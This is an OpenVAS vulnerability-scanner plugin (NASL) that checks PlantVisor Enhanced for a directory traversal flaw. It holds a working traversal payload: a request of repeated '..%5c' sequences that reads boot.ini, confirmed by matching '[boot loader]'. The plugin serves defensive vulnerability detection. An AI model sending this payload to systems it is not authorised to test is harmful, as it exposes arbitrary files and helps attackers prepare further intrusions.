##############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_plantvisor_49601.nasl 9351 2018-04-06 07:05:43Z cfischer $
#
# PlantVisor Enhanced Unspecified Directory Traversal Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_summary = "PlantVisor Enhanced is prone to a directory-traversal vulnerability
because it fails to sufficiently sanitize user-supplied input.

Exploiting this issue will allow an attacker to view arbitrary files
within the context of the webserver. Information harvested may aid in
launching further attacks.

PlantVisor Enhanced 2.4.4 is vulnerable; other versions may also
be affected.";


if (description)
{
 script_oid("1.3.6.1.4.1.25623.1.0.103252");
 script_version("$Revision: 9351 $");
 script_tag(name:"last_modification", value:"$Date: 2018-04-06 09:05:43 +0200 (Fri, 06 Apr 2018) $");
 script_tag(name:"creation_date", value:"2011-09-14 13:31:57 +0200 (Wed, 14 Sep 2011)");
 script_bugtraq_id(49601);
 script_tag(name:"cvss_base", value:"5.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");

 script_name("PlantVisor Enhanced Unspecified Directory Traversal Vulnerability");

 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/49601");
 script_xref(name : "URL" , value : "http://www.carel.com/carelcom/web/eng/catalogo/prodotto_dett.jsp?id_prodotto=91");
 script_xref(name : "URL" , value : "http://aluigi.altervista.org/adv/plantvisor_1-adv.txt");

 script_tag(name:"qod_type", value:"remote_vul");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2011 Greenbone Networks GmbH");
 script_dependencies("gb_get_http_banner.nasl");
 script_mandatory_keys("CarelDataServer/banner");
 script_require_ports("Services/www", 80);
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
   
port = get_http_port(default:80);
if(!get_port_state(port))exit(0);

banner = get_http_banner(port:port);
if( ! banner || "Server: CarelDataServer" >!< banner )exit(0);

url = string("/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cboot.ini"); 

if(http_vuln_check(port:port, url:url,pattern:"\[boot loader\]")) {
  security_message(port:port);
  exit(0);
}

exit(0);
